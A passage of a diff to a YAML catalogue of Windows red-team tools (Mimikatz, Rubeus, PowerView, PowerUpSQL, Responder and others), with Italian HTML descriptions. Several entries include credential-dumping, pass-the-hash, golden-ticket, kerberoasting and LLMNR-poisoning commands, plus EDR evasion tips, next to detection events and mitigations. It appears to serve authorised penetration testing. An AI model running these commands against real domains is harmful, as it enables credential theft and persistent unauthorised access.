+mimikatz # token::elevate</code></pre><p><strong>2. Dump credenziali:</strong></p><pre><code>mimikatz # sekurlsa::logonpasswords</code></pre><p><strong>3. Pass-the-Hash:</strong></p><pre><code>mimikatz # sekurlsa::pth /user:admin /domain:acme.local /ntlm:hash /run:cmd.exe</code></pre><p><strong>4. Golden Ticket (persistence):</strong></p><pre><code>mimikatz # kerberos::golden /domain:acme.local /sid:S-1-5-21... /rc4:krbtgt_hash /user:fakeadmin /ptt</code></pre><br><hr><h4 class=\"rt-amber\">Tecniche avanzate</h4><ul><li><strong>DCSync:</strong> Replica password hashes da DC senza accesso fisico</li><li><strong>Skeleton Key:</strong> Backdoor autenticazione su DC per password master</li><li><strong>Zerologon:</strong> Reset password computer account DC (CVE-2020-1472)</li><li><strong>DPAPI abuse:</strong> Decrypt credenziali di altri utenti con master keys</li></ul><br><hr><h4 class=\"rt-red\">Rilevamento e OPSEC</h4><p><strong>Signature rilevabili:</strong> Accesso a LSASS.exe (Sysmon Event ID 10), caricamento driver mimikatz (mimidrv.sys), pattern in memoria riconosciuti da EDR, DCSync genera eventi 4662.</p><p><strong>Tecniche evasion:</strong> Eseguire da memoria con invoke-mimikatz.ps1, offuscare stringhe e rebuild custom, usare process injection, limitare dump a processi specifici.</p><p><strong>Mitigazioni difensive:</strong> Credential Guard, WDigest disabilitato (Win 8.1+), LSASS protection, Restricted Admin mode RDP, monitoring accessi LSASS.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "pingcastle"
   name: "PingCastle"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["ad-health", "risk-scoring", "reporting"]
+  installation: "GitHub"
   repo: "https://www.pingcastle.com/download/"
-  desc: "Valutazione rapida di sicurezza Active Directory: health check, cartografia
-    trust, indicatori di rischio."
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PingCastle esegue un assessment
-    dell’AD generando un report con punteggio di rischio, indicatori tecnici e raccomandazioni.
-    Include analisi di trust, deleghe e vettori comuni di compromissione.</p><br><hr><h4 class=\"\
-    rt-blue\">Funzioni chiave</h4><ul><li>HealthCheck AD con punteggi e remediation.</li><li>Cartografia
-    della foresta: domini, trust, esposizioni.</li><li>Report HTML interattivi per
-    management e tecnici.</li></ul><br><hr><h4 class=\"rt-blue\">Uso e OPSEC</h4><p>Eseguire
-    con account autorizzato di dominio e scopo ben definito. Condividere il report
-    secondo la policy cliente.</p><br><hr>"
+  desc: "Valutazione rapida di sicurezza Active Directory: health check, cartografia trust, indicatori di rischio"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p>PingCastle esegue un assessment dell'AD generando un report con punteggio di rischio, indicatori tecnici e raccomandazioni. Include analisi di trust, deleghe e vettori comuni di compromissione.</p><br><hr><h4 class=\"rt-purple\">Funzioni chiave</h4><ul><li>HealthCheck AD con punteggi e remediation</li><li>Cartografia della foresta: domini, trust, esposizioni</li><li>Report HTML interattivi per management e tecnici</li></ul><br><hr><h4 class=\"rt-amber\">Uso e OPSEC</h4><p>Eseguire con account autorizzato di dominio e scopo ben definito. Condividere il report secondo la policy cliente.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "powerupsql"
   name: "PowerUpSQL"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["mssql-discovery", "audit-weak-config", "priv-esc", "os-cmd"]
+  installation: "GitHub"
   repo: "https://github.com/NetSPI/PowerUpSQL"
-  desc: "Modulo PowerShell per discovery SQL Server, audit configurazioni deboli e
-    privilege escalation tramite abusi OS command execution e link server"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerUpSQL</strong>
-    di NetSPI è un toolkit PowerShell per attacking SQL Server durante penetration
-    test interni e red team engagement. Supporta discovery di istanze, audit di weak
-    configuration, privilege escalation su scala e post-exploitation actions come
-    OS command execution. Utilizzabile anche da amministratori per inventory rapido
-    e threat hunting.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery:</strong><ul><li><code>Get-SQLInstanceDomain</code>
-    - Enumera istanze SQL via SPN in Active Directory</li><li><code>Get-SQLInstanceBroadcast</code>
-    - Discovery via UDP broadcast (porta 1434)</li><li><code>Get-SQLInstanceScanUDP</code>
-    - Scan subnet per SQL Server Browser</li><li><code>Get-SQLConnectionTest</code>
-    - Test connessioni massive</li></ul></p><p><strong>Weak Configuration Auditing:</strong><ul><li><code>Invoke-SQLAudit</code>
-    - Check completo su configurazioni deboli</li><li><code>Get-SQLServerInfo</code>
-    - Versione, patch level, service account</li><li><code>Get-SQLDatabase</code>
-    - Enum database accessibili</li><li>Verifica default credentials, excessive privileges,
-    weak encryption</li></ul></p><p><strong>Privilege Escalation:</strong><ul><li><code>Invoke-SQLEscalatePriv</code>
-    - Tenta abusi automatici (impersonation, trustworthy DB)</li><li><code>Get-SQLServerLinkCrawl</code>
-    - Naviga catene di link server</li><li><code>Invoke-SQLUncPathInjection</code>
-    - Force authentication via UNC paths</li></ul></p><p><strong>Post-Exploitation:</strong><ul><li><code>Invoke-SQLOSCmd</code>
-    - Esecuzione comandi OS via xp_cmdshell</li><li><code>Get-SQLColumnSampleData</code>
-    - Cerca pattern dati sensibili (SSN, CC)</li><li><code>Get-SQLQuery</code> - Query
-    custom su istanze multiple</li></ul></p><br><hr><h4 class=\"rt-green\">Workflow tipico</h4><p><strong>1.
-    Discovery in dominio:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLServerInfo</code></pre><p><strong>2.
-    Test accesso:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLConnectionTest</code></pre><p><strong>3.
-    Audit completo:</strong></p><pre><code>PS> Invoke-SQLAudit -Instance SQL01 -Verbose</code></pre><p><strong>4.
-    Privilege escalation:</strong></p><pre><code>PS> Invoke-SQLEscalatePriv -Instance
-    SQL01 -Verbose</code></pre><p><strong>5. Command execution:</strong></p><pre><code>PS>
-    Invoke-SQLOSCmd -Instance SQL01 -Command 'whoami' -RawResults</code></pre><br><hr><h4
-    class=\"rt-amber\">Tecniche di abuso</h4><p><strong>Impersonation:</strong> Sfrutta
-    IMPERSONATE permission su login privilegiati per assumere privilegi di sa o sysadmin.</p><p><strong>Trustworthy
-    DB:</strong> Database con TRUSTWORTHY ON permettono escalation se si ha db_owner.</p><p><strong>Link
-    server crawling:</strong> Naviga catene di link per raggiungere istanze non accessibili
-    direttamente ed eseguire query/comandi con contesto privilegiato remoto.</p><br><hr><h4
-    class=\"rt-red\">Considerazioni operative</h4><p>Documentare modifiche a sp_configure
-    (xp_cmdshell enable) e ripristinare post-test. SQL Server audit logs registrano
-    query e impersonation. Limitare scope a istanze autorizzate e considerare impatto
-    su database production.</p><br><hr>"
+  desc: "Modulo PowerShell per discovery SQL Server, audit configurazioni deboli e privilege escalation tramite abusi OS command execution e link server"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerUpSQL</strong> di NetSPI è un toolkit PowerShell per attacking SQL Server durante penetration test interni e red team engagement. Supporta discovery di istanze, audit di weak configuration, privilege escalation su scala e post-exploitation actions come OS command execution.</p><br><hr><h4 class=\"rt-purple\">Funzionalità principali</h4><p><strong>Discovery:</strong> <code>Get-SQLInstanceDomain</code> (enumera istanze SQL via SPN in AD), <code>Get-SQLInstanceBroadcast</code> (discovery via UDP broadcast), <code>Get-SQLInstanceScanUDP</code> (scan subnet per SQL Server Browser), <code>Get-SQLConnectionTest</code> (test connessioni massive).</p><p><strong>Weak Configuration Auditing:</strong> <code>Invoke-SQLAudit</code> (check completo), <code>Get-SQLServerInfo</code> (versione, patch level, service account), <code>Get-SQLDatabase</code> (enum database accessibili).</p><p><strong>Privilege Escalation:</strong> <code>Invoke-SQLEscalatePriv</code> (tenta abusi automatici: impersonation, trustworthy DB), <code>Get-SQLServerLinkCrawl</code> (naviga catene di link server), <code>Invoke-SQLUncPathInjection</code> (force authentication via UNC paths).</p><p><strong>Post-Exploitation:</strong> <code>Invoke-SQLOSCmd</code> (esecuzione comandi OS via xp_cmdshell), <code>Get-SQLColumnSampleData</code> (cerca pattern dati sensibili), <code>Get-SQLQuery</code> (query custom su istanze multiple).</p><br><hr><h4 class=\"rt-green\">Workflow tipico</h4><p><strong>1. Discovery in dominio:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLServerInfo</code></pre><p><strong>2. Test accesso:</strong></p><pre><code>PS> Get-SQLInstanceDomain | Get-SQLConnectionTest</code></pre><p><strong>3. Audit completo:</strong></p><pre><code>PS> Invoke-SQLAudit -Instance SQL01 -Verbose</code></pre><p><strong>4. Privilege escalation:</strong></p><pre><code>PS> Invoke-SQLEscalatePriv -Instance SQL01 -Verbose</code></pre><p><strong>5. Command execution:</strong></p><pre><code>PS> Invoke-SQLOSCmd -Instance SQL01 -Command 'whoami' -RawResults</code></pre><br><hr><h4 class=\"rt-amber\">Tecniche di abuso</h4><p><strong>Impersonation:</strong> Sfrutta IMPERSONATE permission su login privilegiati per assumere privilegi di sa o sysadmin.</p><p><strong>Trustworthy DB:</strong> Database con TRUSTWORTHY ON permettono escalation se si ha db_owner.</p><p><strong>Link server crawling:</strong> Naviga catene di link per raggiungere istanze non accessibili direttamente ed eseguire query/comandi con contesto privilegiato remoto.</p><br><hr><h4 class=\"rt-red\">Considerazioni operative</h4><p>Documentare modifiche a sp_configure (xp_cmdshell enable) e ripristinare post-test. SQL Server audit logs registrano query e impersonation. Limitare scope a istanze autorizzate e considerare impatto su database production.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "powerview-ps1"
   name: "PowerView.ps1"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["ad-enum", "acl-abuse", "situational-awareness"]
+  installation: "GitHub"
   repo: "https://github.com/PowerShellMafia/PowerSploit"
-  desc: "Modulo PowerShell per enumerazione AD avanzata (ACL, deleghe, GPO, sessioni)
-    e individuazione path di privilege escalation"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerView.ps1</strong>
-    è il modulo Recon di PowerSploit per enumerazione completa di Active Directory.
-    Fornisce network e Windows domain enumeration/exploitation con focus su relazioni
-    di trust, ACL exploitable e situational awareness. Ampiamente usato per preparare
-    dati input a BloodHound.</p><br><hr><h4 class=\"rt-purple\">Categorie di enumerazione</h4><p><strong>Utenti
-    e gruppi:</strong><ul><li><code>Get-NetUser</code> - Enum utenti con filtri (AdminCount,
-    SPN, lastlogon)</li><li><code>Get-NetGroup</code> - Gruppi e membership</li><li><code>Get-NetGroupMember</code>
-    - Membri ricorsivi</li><li><code>Get-NetLocalGroup</code> - Local admins su host
-    remoti</li></ul></p><p><strong>Computer e sessioni:</strong><ul><li><code>Get-NetComputer</code>
-    - Computer di dominio con filtri</li><li><code>Get-NetSession</code> - Sessioni
-    attive su remoti</li><li><code>Get-NetLoggedon</code> - Utenti logged on via registry</li><li><code>Find-DomainUserLocation</code>
-    - Hunting sessioni di account specifici</li></ul></p><p><strong>Trust e forest:</strong><ul><li><code>Get-NetDomainTrust</code>
-    - Trust relationships</li><li><code>Get-NetForestDomain</code> - Domini in forest
-    corrente</li><li><code>Get-NetForestTrust</code> - Trust inter-forest</li></ul></p><p><strong>ACL
-    e deleghe:</strong><ul><li><code>Find-InterestingDomainAcl</code> - ACE exploitable</li><li><code>Get-ObjectAcl</code>
-    - ACL raw di oggetti</li><li><code>Add-ObjectAcl</code> - Modifica ACL (post-compromise)</li></ul></p><p><strong>GPO:</strong><ul><li><code>Get-NetGPO</code>
-    - Group Policy Objects</li><li><code>Get-NetGPOGroup</code> - GPO che modificano
-    local groups</li><li><code>Find-GPOLocation</code> - Applicazione GPO</li></ul></p><p><strong>SPN
-    e Kerberoasting:</strong><ul><li><code>Get-NetUser -SPN</code> - Account kerberoastable</li><li><code>Request-SPNTicket</code>
-    - Richiede TGS</li></ul></p><br><hr><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>Admin
-    privilegiati:</strong></p><pre><code>PS> Get-NetUser -AdminCount 1 | select samaccountname,memberof</code></pre><p><strong>Hunting
-    sessioni DA:</strong></p><pre><code>PS> Find-DomainUserLocation -UserGroupIdentity
-    'Domain Admins'</code></pre><p><strong>ACL exploitable:</strong></p><pre><code>PS>
-    Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain
-    Users'}</code></pre><br><hr><h4 class=\"rt-amber\">Integration con BloodHound</h4><p>PowerView
-    è usato per query ad-hoc e investigation mirata. SharpHound ha sostituito PowerView
-    per data collection automatica, ma PowerView rimane utile per enumerazione custom
-    e troubleshooting.</p><br><hr><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Query LDAP
-    massive rilevabili da anomaly detection. Difese monitorano query con filtri ampi
-    (AdminCount, SPN), accesso attributi sensibili e pattern tool automatici. PowerShell
-    script block logging cattura comandi eseguiti.</p><br><hr>"
+  desc: "Modulo PowerShell per enumerazione AD avanzata (ACL, deleghe, GPO, sessioni) e individuazione path di privilege escalation"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>PowerView.ps1</strong> è il modulo Recon di PowerSploit per enumerazione completa di Active Directory. Fornisce network e Windows domain enumeration/exploitation con focus su relazioni di trust, ACL exploitable e situational awareness.</p><br><hr><h4 class=\"rt-purple\">Categorie di enumerazione</h4><p><strong>Utenti e gruppi:</strong> <code>Get-NetUser</code> (enum utenti con filtri), <code>Get-NetGroup</code> (gruppi e membership), <code>Get-NetGroupMember</code> (membri ricorsivi), <code>Get-NetLocalGroup</code> (local admins su host remoti).</p><p><strong>Computer e sessioni:</strong> <code>Get-NetComputer</code> (computer di dominio con filtri), <code>Get-NetSession</code> (sessioni attive su remoti), <code>Get-NetLoggedon</code> (utenti logged on via registry), <code>Find-DomainUserLocation</code> (hunting sessioni di account specifici).</p><p><strong>Trust e forest:</strong> <code>Get-NetDomainTrust</code> (trust relationships), <code>Get-NetForestDomain</code> (domini in forest corrente), <code>Get-NetForestTrust</code> (trust inter-forest).</p><p><strong>ACL e deleghe:</strong> <code>Find-InterestingDomainAcl</code> (ACE exploitable), <code>Get-ObjectAcl</code> (ACL raw di oggetti), <code>Add-ObjectAcl</code> (modifica ACL post-compromise).</p><p><strong>GPO:</strong> <code>Get-NetGPO</code> (Group Policy Objects), <code>Get-NetGPOGroup</code> (GPO che modificano local groups), <code>Find-GPOLocation</code> (applicazione GPO).</p><p><strong>SPN e Kerberoasting:</strong> <code>Get-NetUser -SPN</code> (account kerberoastable), <code>Request-SPNTicket</code> (richiede TGS).</p><br><hr><h4 class=\"rt-green\">Esempi operativi</h4><p><strong>Admin privilegiati:</strong></p><pre><code>PS> Get-NetUser -AdminCount 1 | select samaccountname,memberof</code></pre><p><strong>Hunting sessioni DA:</strong></p><pre><code>PS> Find-DomainUserLocation -UserGroupIdentity 'Domain Admins'</code></pre><p><strong>ACL exploitable:</strong></p><pre><code>PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match 'Domain Users'}</code></pre><br><hr><h4 class=\"rt-amber\">Integration con BloodHound</h4><p>PowerView è usato per query ad-hoc e investigation mirata. SharpHound ha sostituito PowerView per data collection automatica, ma PowerView rimane utile per enumerazione custom e troubleshooting.</p><br><hr><h4 class=\"rt-red\">OPSEC e rilevamento</h4><p>Query LDAP massive rilevabili da anomaly detection. Difese monitorano query con filtri ampi (AdminCount, SPN), accesso attributi sensibili e pattern tool automatici. PowerShell script block logging cattura comandi eseguiti.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "responder-windows"
   name: "Responder-Windows"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["llmnr-nbns-mdns-poisoning", "hash-capture", "relay"]
+  installation: "GitHub"
   repo: "https://github.com/lgandx/Responder-Windows"
-  desc: "Port Windows di Responder per poisoning LLMNR/NBNS/mDNS e cattura hash NTLM,
-    con listener rogue HTTP/SMB/LDAP per relay attack"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder-Windows</strong>
-    è il port nativo di Responder per Windows, permettendo MITM attacks senza Python.
-    Effettua poisoning di protocolli name resolution e fornisce listener rogue per
-    cattura credenziali NetNTLM.</p><br><hr><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Spoofers:</strong>
-    LLMNR (5355/UDP), NBNS (137/UDP), mDNS (5353/UDP)</p><p><strong>Listener:</strong>
-    HTTP/HTTPS (80/443), SMB, LDAP, WebDAV, FTP, POP3, IMAP, SMTP</p><br><hr><h4 class=\"\
-    rt-green\">Utilizzo base</h4><p><strong>Start default:</strong></p><pre><code>Responder.exe
-    -I eth0</code></pre><p><strong>Solo HTTP:</strong></p><pre><code>Responder.exe
-    -I eth0 -w -F</code></pre><p><strong>Analysis mode passivo:</strong></p><pre><code>Responder.exe
-    -I eth0 -A</code></pre><br><hr><h4 class=\"rt-amber\">Scenari d'attacco</h4><p><strong>Credential
-    harvesting:</strong> Host con fallback a LLMNR/NBNS inviano broadcast queries.
-    Responder risponde e cattura hash durante autenticazione client.</p><p><strong>Hash
-    cracking:</strong> Hash salvati in <code>logs/</code> directory, crack con:<br><code>hashcat
-    -m 5600 hashes.txt wordlist.txt</code> (NTLMv2)</p><br><hr><h4 class=\"rt-red\">OPSEC</h4><p>Rumoroso
-    e rilevabile: genera risposte a broadcast queries, può causare service disruption.
-    SMB signing e EPA bloccano relay. Best practice: analysis mode prima di active
-    poisoning, whitelist host critici, limitare durata attacco.</p><br><hr>"
+  desc: "Port Windows di Responder per poisoning LLMNR/NBNS/mDNS e cattura hash NTLM, con listener rogue HTTP/SMB/LDAP per relay attack"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Responder-Windows</strong> è il port nativo di Responder per Windows, permettendo MITM attacks senza Python. Effettua poisoning di protocolli name resolution e fornisce listener rogue per cattura credenziali NetNTLM.</p><br><hr><h4 class=\"rt-purple\">Protocolli supportati</h4><p><strong>Spoofers:</strong> LLMNR (5355/UDP), NBNS (137/UDP), mDNS (5353/UDP)</p><p><strong>Listener:</strong> HTTP/HTTPS (80/443), SMB, LDAP, WebDAV, FTP, POP3, IMAP, SMTP</p><br><hr><h4 class=\"rt-green\">Utilizzo base</h4><p><strong>Start default:</strong></p><pre><code>Responder.exe -I eth0</code></pre><p><strong>Solo HTTP:</strong></p><pre><code>Responder.exe -I eth0 -w -F</code></pre><p><strong>Analysis mode passivo:</strong></p><pre><code>Responder.exe -I eth0 -A</code></pre><br><hr><h4 class=\"rt-amber\">Scenari d'attacco</h4><p><strong>Credential harvesting:</strong> Host con fallback a LLMNR/NBNS inviano broadcast queries. Responder risponde e cattura hash durante autenticazione client.</p><p><strong>Hash cracking:</strong> Hash salvati in <code>logs/</code> directory, crack con: <code>hashcat -m 5600 hashes.txt wordlist.txt</code> (NTLMv2)</p><br><hr><h4 class=\"rt-red\">OPSEC</h4><p>Rumoroso e rilevabile: genera risposte a broadcast queries, può causare service disruption. SMB signing e EPA bloccano relay. Best practice: analysis mode prima di active poisoning, whitelist host critici, limitare durata attacco.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "rpcdump-windows"
   name: "rpcdump_windows.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["rpc-enum", "endpoint-mapper"]
+  installation: "GitHub"
   repo: "https://github.com/csandker/RPCDump"
-  desc: "Tool per enumerazione RPC Endpoint Mapper con listing di interfacce/UUID/binding,
-    utile per mappare superfici d'attacco RPC su Windows"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rpcdump_windows.exe</strong>
-    interroga RPC Endpoint Mapper (135/tcp) per elencare interfacce RPC registrate
-    su host Windows, inclusi UUID, versione, protocolli binding e annotation.</p><br><hr><h4
-    class=\"rt-purple\">Informazioni raccolte</h4><p>Per ogni interfaccia: UUID (identificatore
-    unico), Version (major.minor), Binding strings (ncacn_np, ncacn_ip_tcp, ncalrpc),
-    Annotation (descrizione), Endpoint (named pipe, TCP port, local RPC).</p><br><hr><h4 class=\"\
-    rt-green\">Utilizzo</h4><p><strong>Locale:</strong> <code>rpcdump.exe</code><br><strong>Remoto:</strong>
-    <code>rpcdump.exe -p 192.168.1.10</code><br><strong>Verbose:</strong> <code>rpcdump.exe
-    -p target -v</code></p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Service
-    discovery:</strong> Identificare servizi custom non documentati.<br><strong>Vulnerability
-    correlation:</strong> Confrontare UUID con CVE note (MS08-067, PrintNightmare,
-    PetitPotam).<br><strong>ACL testing:</strong> Testare permessi su named pipes
-    ed endpoints dopo enum.</p><br><hr><h4 class=\"rt-red\">UUID interessanti</h4><p>SAMR:
-    12345778-1234-ABCD-EF00-0123456789AB<br>LSARPC: 3919286a-b10c-11d0-9ba8-00c04fd92ef5<br>SVCCTL:
-    367abb81-9844-35f1-ad32-98f038001003<br>NETLOGON: 12345678-1234-ABCD-EF00-01234567CFFB</p><br><hr>"
+  desc: "Tool per enumerazione RPC Endpoint Mapper con listing di interfacce/UUID/binding, utile per mappare superfici d'attacco RPC su Windows"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>rpcdump_windows.exe</strong> interroga RPC Endpoint Mapper (135/tcp) per elencare interfacce RPC registrate su host Windows, inclusi UUID, versione, protocolli binding e annotation.</p><br><hr><h4 class=\"rt-purple\">Informazioni raccolte</h4><p>Per ogni interfaccia: UUID (identificatore unico), Version (major.minor), Binding strings (ncacn_np, ncacn_ip_tcp, ncalrpc), Annotation (descrizione), Endpoint (named pipe, TCP port, local RPC).</p><br><hr><h4 class=\"rt-green\">Utilizzo</h4><p><strong>Locale:</strong> <code>rpcdump.exe</code></p><p><strong>Remoto:</strong> <code>rpcdump.exe -p 192.168.1.10</code></p><p><strong>Verbose:</strong> <code>rpcdump.exe -p target -v</code></p><br><hr><h4 class=\"rt-amber\">Casi d'uso</h4><p><strong>Service discovery:</strong> Identificare servizi custom non documentati.</p><p><strong>Vulnerability correlation:</strong> Confrontare UUID con CVE note (MS08-067, PrintNightmare, PetitPotam).</p><p><strong>ACL testing:</strong> Testare permessi su named pipes ed endpoints dopo enum.</p><br><hr><h4 class=\"rt-red\">UUID interessanti</h4><p>SAMR: 12345778-1234-ABCD-EF00-0123456789AB<br>LSARPC: 3919286a-b10c-11d0-9ba8-00c04fd92ef5<br>SVCCTL: 367abb81-9844-35f1-ad32-98f038001003<br>NETLOGON: 12345678-1234-ABCD-EF00-01234567CFFB</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "rubeus"
   name: "Rubeus.exe"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["kerberos-abuse", "asreproast", "kerberoast", "ptt", "ticket-management"]
+  installation: "GitHub"
   repo: "https://github.com/GhostPack/Rubeus"
-  desc: "Toolkit C# per attacchi Kerberos (AS-REP roast, Kerberoasting, ticket dump/inject/forge)
-    e abuse di delegation su domini AD"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> di GhostPack
-    è il toolkit di riferimento per attacchi Kerberos su AD. Implementa credential
-    access, privilege escalation e persistence tramite manipolazione ticket TGT/TGS.</p><br><hr><h4
-    class=\"rt-purple\">Comandi principali</h4><p><strong>AS-REP Roasting:</strong></p><pre><code>Rubeus.exe
-    asreproast /format:hashcat /outfile:hashes.txt</code></pre><p><strong>Kerberoasting:</strong></p><pre><code>Rubeus.exe
-    kerberoast /outfile:tgs.txt /nowrap</code></pre><p><strong>Ticket dump:</strong></p><pre><code>Rubeus.exe
-    dump /service:krbtgt /nowrap</code></pre><p><strong>Pass-the-Ticket:</strong></p><pre><code>Rubeus.exe
-    ptt /ticket:base64ticket</code></pre><p><strong>Overpass-the-Hash:</strong></p><pre><code>Rubeus.exe
-    asktgt /user:admin /rc4:hash /ptt</code></pre><p><strong>Golden Ticket:</strong></p><pre><code>Rubeus.exe
-    golden /rc4:krbtgt_hash /user:fake /id:500 /domain:acme.local /sid:S-1-5-21...
-    /ptt</code></pre><p><strong>S4U abuse:</strong></p><pre><code>Rubeus.exe s4u /user:svc
-    /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt</code></pre><br><hr><h4 class=\"\
-    rt-green\">Workflow AS-REP Roasting</h4><p>1. Enum: <code>Rubeus.exe asreproast
-    /format:hashcat</code><br>2. Crack: <code>hashcat -m 18200 hashes.txt wordlist.txt</code><br>3.
-    Validazione credenziali</p><br><hr><h4 class=\"rt-amber\">Delegation abuse</h4><p><strong>Unconstrained:</strong>
-    Cattura TGT di utenti autenticati.<br><strong>Constrained:</strong> Richiedi ticket
-    per servizi specificati impersonando utenti.<br><strong>RBCD:</strong> Configura
-    resource-based constrained delegation per accesso risorse.</p><br><hr><h4 class=\"rt-red\"\
-    >Rilevamento</h4><p>Eventi 4768/4769/4770 anomali, 4672 per operazioni elevated.
-    Mitigazioni: AES-only Kerberos, Protected Users group, SIEM rules per anomalie
-    AS-REQ/TGS.</p><br><hr>"
+  desc: "Toolkit C# per attacchi Kerberos (AS-REP roast, Kerberoasting, ticket dump/inject/forge) e abuse di delegation su domini AD"
+  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>Rubeus</strong> di GhostPack è il toolkit di riferimento per attacchi Kerberos su AD. Implementa credential access, privilege escalation e persistence tramite manipolazione ticket TGT/TGS.</p><br><hr><h4 class=\"rt-purple\">Comandi principali</h4><p><strong>AS-REP Roasting:</strong></p><pre><code>Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt</code></pre><p><strong>Kerberoasting:</strong></p><pre><code>Rubeus.exe kerberoast /outfile:tgs.txt /nowrap</code></pre><p><strong>Ticket dump:</strong></p><pre><code>Rubeus.exe dump /service:krbtgt /nowrap</code></pre><p><strong>Pass-the-Ticket:</strong></p><pre><code>Rubeus.exe ptt /ticket:base64ticket</code></pre><p><strong>Overpass-the-Hash:</strong></p><pre><code>Rubeus.exe asktgt /user:admin /rc4:hash /ptt</code></pre><p><strong>Golden Ticket:</strong></p><pre><code>Rubeus.exe golden /rc4:krbtgt_hash /user:fake /id:500 /domain:acme.local /sid:S-1-5-21... /ptt</code></pre><p><strong>S4U abuse:</strong></p><pre><code>Rubeus.exe s4u /user:svc /rc4:hash /impersonateuser:admin /msdsspn:cifs/target /ptt</code></pre><br><hr><h4 class=\"rt-green\">Workflow AS-REP Roasting</h4><p>1. Enum: <code>Rubeus.exe asreproast /format:hashcat</code><br>2. Crack: <code>hashcat -m 18200 hashes.txt wordlist.txt</code><br>3. Validazione credenziali</p><br><hr><h4 class=\"rt-amber\">Delegation abuse</h4><p><strong>Unconstrained:</strong> Cattura TGT di utenti autenticati.</p><p><strong>Constrained:</strong> Richiedi ticket per servizi specificati impersonando utenti.</p><p><strong>RBCD:</strong> Configura resource-based constrained delegation per accesso risorse.</p><br><hr><h4 class=\"rt-red\">Rilevamento</h4><p>Eventi 4768/4769/4770 anomali, 4672 per operazioni elevated. Mitigazioni: AES-only Kerberos, Protected Users group, SIEM rules per anomalie AS-REQ/TGS.</p><br><hr>"
   best_in: false
-  category_path: ["00_Common", "Tools_Windows"]
+  category_path: [ "00_Common", "Tools_Windows" ]
   notes:
 
 - id: "securityassessment-ps1"
   name: "SecurityAssessment.ps1"
   version: ""
   icon: "../app/icons/github.svg"
-  kind: "windows"
-  phases: ["00_Common"]
-  caps: ["host-baseline", "policy-audit", "inventory"]
+  installation: "GitHub"
   repo: ""
-  desc: "Script PowerShell per raccolta baseline sicurezza host Windows (GPO, policy,
-    servizi, patch) con output strutturato per audit e hardening"
-  desc_long: "<h4 class=\"rt-blue\">Panoramica</h4><p><strong>SecurityAssessment.ps1</strong>
-    raccoglie baseline di sicurezza host Windows esportando configurazioni, policy
-    effettive e inventory sistema in formato strutturato. Solo lettura passiva, nessuna
-    modifica.</p><br><hr><h4 class=\"rt-purple\">Dati raccolti</h4><p><strong>Group Policy:</strong>
-    gpresult /h con policy applicate.<br><strong>Security Policy:</strong> secedit
-    export, auditpol, User Rights Assignment.<br><strong>Network config:</strong>
-    SMB versions/signing, NTLM settings, firewall rules.<br><strong>System inventory:</strong>
-    Software, patch level, servizi, scheduled tasks, processi.<br><strong>Security
-    features:</strong> Defender status, AppLocker, BitLocker, UAC.</p><br><hr><h4 class=\"\
-    rt-green\">Esecuzione</h4><p><strong>Prerequisiti:</strong> PowerShell elevated<br><strong>Basic:</strong>
-    <code>PS> .\\SecurityAssessment.ps1</code><br><strong>Custom output:</strong>
-    <code>PS> .\\SecurityAssessment.ps1 -OutputPath C:\\Assessments</code></p><p>Output:
-    ZIP con report, HTML summary dashboard, log timestamp.</p><br><hr><h4 class=\"rt-amber\"\
-    >Casi d'uso</h4><p><strong>Pre-hardening baseline:</strong> Stato prima di security
-    baselines.<br><strong>Compliance verification:</strong> Confronto con benchmarks
